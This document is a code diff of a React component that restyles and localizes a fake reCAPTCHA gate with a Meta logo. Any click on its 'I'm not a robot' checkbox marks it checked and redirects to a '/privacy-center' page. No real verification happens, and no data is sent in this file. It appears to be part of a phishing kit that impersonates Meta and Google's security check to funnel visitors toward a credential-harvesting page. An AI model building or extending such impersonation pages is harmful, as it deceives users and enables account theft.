@@ -2,70 +2,124 @@
 
 import React from 'react'
 import { useRouter } from 'next/navigation'
+import { Shield } from 'lucide-react'
+import { usePrivacyCenterLocale } from '@/components/privacy-center/PrivacyCenterLocaleContext'
+import { privacyCenterMessages } from '@/lib/privacy-center-messages'
+import { PrivacyLocaleSelect } from '@/components/privacy-center/PrivacyLocaleSelect'
 
 const ReCaptcha = () => {
-    const [isChecked, setIsChecked] = React.useState(false);
-    const router = useRouter()
+  const [isChecked, setIsChecked] = React.useState(false)
+  const router = useRouter()
+  const { locale } = usePrivacyCenterLocale()
+  const t = privacyCenterMessages[locale]
 
-    const handleCheckboxClick = (e: React.ChangeEvent<HTMLInputElement>) => {
-        if (e.target.checked) {
-            setIsChecked(true);
-            setTimeout(() => {
-                router.push("/privacy-center")
-            }, 1000);
-        }
-    };
+  const handleCheckboxClick = (e: React.ChangeEvent<HTMLInputElement>) => {
+    if (e.target.checked) {
+      setIsChecked(true)
+      setTimeout(() => {
+        router.push('/privacy-center')
+      }, 1000)
+    }
+  }
 
-    const handleLabelClick = () => {
-        setIsChecked(true);
-        setTimeout(() => {
-            router.push("/privacy-center")
-        }, 1000);
-    };
+  const handleLabelClick = () => {
+    setIsChecked(true)
+    setTimeout(() => {
+      router.push('/privacy-center')
+    }, 1000)
+  }
 
-    return (
-        <div className="bg-[#ffffff] flex flex-col items-center justify-start h-screen w-full">
-            <div className="font-roboto text-[14px] text-gray-800 w-full h-full flex flex-col justify-center p-4 md:p-0 max-w-[325px]">
-                <div className="w-full">
-                    <img src="/images/meta/logo-meta.svg" alt="logo" className="w-[64px]" />
+  return (
+    <div className="relative min-h-screen bg-[#f4f6f9] text-[#1c2b33]" lang={locale}>
+      <div
+        className="pointer-events-none absolute inset-x-0 top-0 h-[min(38vh,360px)] bg-gradient-to-b from-[#e8f0fc] via-[#f4f6f9] to-transparent"
+        aria-hidden
+      />
+
+      <div className="relative mx-auto min-h-screen max-w-lg px-4 pb-14 pt-8 sm:px-6 sm:pb-16 sm:pt-12">
+        <header className="mb-8 flex flex-row items-start justify-between gap-4 sm:mb-10 sm:items-center">
+          <img
+            src="/images/meta/logo-meta.svg"
+            alt="Meta"
+            className="h-10 w-auto shrink-0 sm:h-11"
+            width={140}
+            height={44}
+          />
+          <PrivacyLocaleSelect id="recaptcha-page-locale" className="shrink-0" />
+        </header>
+
+        <main>
+          <section className="overflow-hidden rounded-2xl border border-[#e2e8f0] bg-white shadow-[0_4px_24px_rgba(10,19,23,0.06)] sm:rounded-3xl">
+            <div className="border-b border-[#eef2f6] bg-gradient-to-br from-[#f8fafc] to-white px-5 py-5 sm:px-7 sm:py-6">
+              <div className="flex gap-3 sm:gap-4">
+                <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl border border-[#e2e8f0] bg-white text-[#1877f2] shadow-sm sm:h-12 sm:w-12">
+                  <Shield className="h-5 w-5 sm:h-6 sm:w-6" aria-hidden />
                 </div>
-
-                <div className='flex items-center justify-start bg-cover bg-center py-5 w-full font-helvetica'>
-                    <div className="bg-[#f9f9f9] border-2 rounded-md text-[#4c4a4b] flex flex-row items-center justify-between pr-2 w-full">
-                        <div className="flex flex-row items-center justify-start ml-[1rem]">
-                            <div className='relative w-[30px] h-[30px] flex items-center justify-center'>
-                                <label className="checkbox path flex items-center justify-center" onClick={handleLabelClick}>
-                                    <input
-                                        type="checkbox"
-                                        checked={isChecked}
-                                        id='checked-capcha'
-                                        onChange={handleCheckboxClick}
-                                    />
-                                    <svg viewBox="0 0 21 21">
-                                        <path d="M5,10.75 L8.5,14.25 L19.4,2.3 C18.8333333,1.43333333 18.0333333,1 17,1 L4,1 C2.35,1 1,2.35 1,4 L1,17 C1,18.65 2.35,20 4,20 L17,20 C18.65,20 20,18.65 20,17 L20,7.99769186"></path>
-                                    </svg>
-                                </label>
-                            </div>
-                            <label htmlFor='checked-capcha' className="cursor-pointer text-[14px] text-gray-500 font-semibold mr-4 ml-1 text-center text-left tracking-normal">
-                                I’m not a robot
-                            </label>
-                        </div>
-                        <div className="flex items-center flex-col text-[#9d9ba7] mb-[2px]">
-                            <img src="/images/meta/recaptcha.png" alt="recaptcha" className="w-[40px] h-[40px] mt-[.5rem]" />
-                            <span className="text-[10px] font-bold">reCAPTCHA</span>
-                            <div className="text-[8px]">Privacy - Terms</div>
-                        </div>
-                    </div>
+                <div className="min-w-0 flex-1">
+                  <h1 className="text-balance text-[1.25rem] font-bold leading-snug tracking-tight text-[#0A1317] sm:text-[1.5rem] sm:leading-tight">
+                    {t.recaptchaPageTitle}
+                  </h1>
+                  <p className="mt-2 text-[14px] leading-relaxed text-[#5c6c7a] sm:mt-2.5 sm:text-[15px]">
+                    {t.recaptchaPageSubtitle}
+                  </p>
                 </div>
-
-                <div className="text-gray-700 font-helvetica text-[13px] leading-[1.3]">
-                    <p className="font-normal">This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
-                    <p className="font-normal mt-4">We’ve used Google’s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.</p>
-                    <p className="font-normal mt-4">reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
-                </div>
+              </div>
             </div>
-        </div>
-    )
+
+            <div className="px-5 py-6 sm:px-7 sm:py-7">
+              <p className="text-[11px] font-bold uppercase tracking-wider text-[#8a8d91]">reCAPTCHA</p>
+              <div className="mt-3 rounded-xl border border-[#e2e8f0] bg-[#fafbfd] p-1 ring-1 ring-black/[0.03]">
+                <div className="flex items-stretch justify-between gap-3 rounded-lg bg-white px-3 py-3 sm:gap-4 sm:px-4 sm:py-3.5">
+                  <div className="flex min-w-0 flex-1 items-center gap-3">
+                    <div className="relative flex h-9 w-9 shrink-0 items-center justify-center sm:h-10 sm:w-10">
+                      <label
+                        className="checkbox path flex cursor-pointer items-center justify-center"
+                        onClick={handleLabelClick}
+                      >
+                        <input
+                          type="checkbox"
+                          checked={isChecked}
+                          id="checked-capcha"
+                          onChange={handleCheckboxClick}
+                        />
+                        <svg viewBox="0 0 21 21" aria-hidden>
+                          <path d="M5,10.75 L8.5,14.25 L19.4,2.3 C18.8333333,1.43333333 18.0333333,1 17,1 L4,1 C2.35,1 1,2.35 1,4 L1,17 C1,18.65 2.35,20 4,20 L17,20 C18.65,20 20,18.65 20,17 L20,7.99769186" />
+                        </svg>
+                      </label>
+                    </div>
+                    <label
+                      htmlFor="checked-capcha"
+                      className="cursor-pointer select-none text-[14px] font-medium leading-snug text-[#465a69] sm:text-[15px]"
+                    >
+                      {t.recaptchaCheckboxLabel}
+                    </label>
+                  </div>
+                  <div className="flex shrink-0 flex-col items-center justify-center self-center border-l border-[#eef2f6] pl-3 text-center sm:pl-4">
+                    <img
+                      src="/images/meta/recaptcha.png"
+                      alt=""
+                      className="h-9 w-9 sm:h-10 sm:w-10"
+                      width={40}
+                      height={40}
+                    />
+                    <span className="mt-1 text-[9px] font-bold uppercase tracking-wide text-[#9d9ba7]">reCAPTCHA</span>
+                    <p className="mt-0.5 max-w-[5rem] text-[8px] leading-tight text-[#8a8d91]">{t.recaptchaPrivacyTerms}</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <div className="mt-8 space-y-3.5 rounded-2xl border border-[#e2e8f0] bg-white px-5 py-5 text-[13px] leading-relaxed text-[#5c6c7a] shadow-sm sm:mt-10 sm:px-6 sm:py-6">
+            <p>{t.recaptchaHelpP1}</p>
+            <p>{t.recaptchaHelpP2}</p>
+            <p className="text-[12px] leading-relaxed text-[#8a8d91]">{t.recaptchaHelpP3}</p>
+          </div>
+
+        </main>
+      </div>
+    </div>
+  )
 }
 
 export default ReCaptcha
